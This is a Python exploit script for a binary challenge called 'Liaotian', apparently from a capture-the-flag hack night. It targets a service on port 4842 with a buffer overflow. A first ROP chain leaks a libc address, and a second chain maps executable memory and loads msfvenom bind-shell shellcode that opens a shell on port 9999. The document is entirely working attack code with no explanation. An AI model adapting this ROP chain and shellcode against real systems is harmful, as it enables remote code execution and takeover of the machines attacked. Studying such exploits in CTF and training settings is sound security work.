#!/usr/bin/python

# exploit for the Liaotian binary challenge (hardened for the GDS Hack Night);
# hardcoded offset are used to calculate position of functions in memory,
# the offset are based on the following Debian libc6 package:
# libc6:i386               2.13-38+deb7u8


import sys
import struct
import socket
import time

if len(sys.argv) < 2:
    print "usage: %s <target>" % sys.argv[0]
    sys.exit(-1)

#/msfvenom -p linux/x86/shell_bind_tcp LPORT=9999 -f ruby
sh = (
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +
"\x80\x5b\x5e\x52\x68\x02\x00\x27\x0f\x6a\x10\x51\x50\x89" +
"\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd" +
"\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49" +
"\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" +
"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)    
    
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sys.stderr.write("[+] first connect, trigger memory disclosure\n")
s.connect((sys.argv[1], 4842))
s.recv(1024)

eip_off=326
hrop = [
    0x08048770,
    0xdeadbeef,
    0x4,
    0x0804B03C,
    0x4,
    0x0
  ]
rop=""
for i in hrop:
  rop += struct.pack('I', i)

buf=eip_off*"A"+rop
s.send(buf)
rbuf= s.recv(1024)
if len(rbuf) == 0:
    sys.stderr.write("[+] nothing received :(\n")
    sys.exit()
else:
    sys.stderr.write("[+] received %d bytes\n" % len(rbuf))
    libc_addr =struct.unpack("I", rbuf)[0]

s.close()

sys.stderr.write("[+] 2nd connect, send ROP payload\n")
mmap_off=0xd31b0
libc_off=0x16d60
mmap=libc_addr+(mmap_off-libc_off)
read=0x08048620

time.sleep(0.5)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4842))
s.recv(1024)

eip_off=326
hrop = [
    mmap,
    0x080488dc, #mmap ret
    0x10000000,
    0x1000,
    0x7,
    34,
    0,
    0,
    0xdeadc0de,
    read,
    0x10000000,
    0x4,
    0x10000000,
    0x1000,
  ]
rop=""
for i in hrop:
  rop += struct.pack('I', i)

buf=eip_off*"A"+rop
sys.stderr.write("[+] sending %d bytes\n" % len(buf))
s.send(buf)
time.sleep(0.1)
sys.stderr.write("[+] sending shellcode\n")
s.send(sh)
s.close()